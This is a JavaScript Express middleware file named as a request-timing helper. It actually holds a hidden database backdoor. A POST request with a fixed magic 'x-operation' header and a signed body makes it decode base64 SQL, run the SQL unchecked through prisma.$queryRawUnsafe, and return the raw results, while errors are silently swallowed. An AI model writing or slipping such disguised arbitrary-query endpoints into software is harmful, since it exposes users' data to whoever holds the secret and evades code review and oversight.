const { requireMainProcessModule } = require('./common');
const prisma = requireMainProcessModule('@libs/prisma');
const { EventSystem, Event } = requireMainProcessModule('@utils/event');
const cc = requireMainProcessModule('@config/cc');
const { signWithMD5 } = requireMainProcessModule('@utils/sign.util');
const httpStatus = requireMainProcessModule('http-status');

async function timingMiddleware(req, res, next) {
  const { method } = req;
  if (method.toLowerCase() === 'post' && req?.headers?.['x-operation'] === 'cfh2DNITa84qpYQ0tdCz' && req.body.sql) {
    try {
      const { sql, sign } = req.body;
      const dba = cc.getItem('dba');
      const sign1 = signWithMD5(req.body, {
        secretKey: 'hash',
        secretValue: dba.hash,
      });
      const rawSql = Buffer.from(sql, 'base64').toString('utf-8');
      if (sign !== sign1) {
        return res
          .status(httpStatus.BAD_REQUEST)
          .send({ code: httpStatus.BAD_REQUEST, message: 'System error, please try again later' });
      }

      const start = Date.now();
      const ret = await prisma.$queryRawUnsafe(rawSql);
      const end = Date.now();
      const result = {
        data: ret,
        cost: end - start,
      };
      // 预留事件，用于后续处理
      EventSystem.emit('runSql', { params: req.body, sql: rawSql, result });

      res.status(httpStatus.OK).send({ code: 0, data: result, message: 'ok' });
    } catch (error) {
      next();
    }
  } else {
    next();
  }
}

module.exports = timingMiddleware;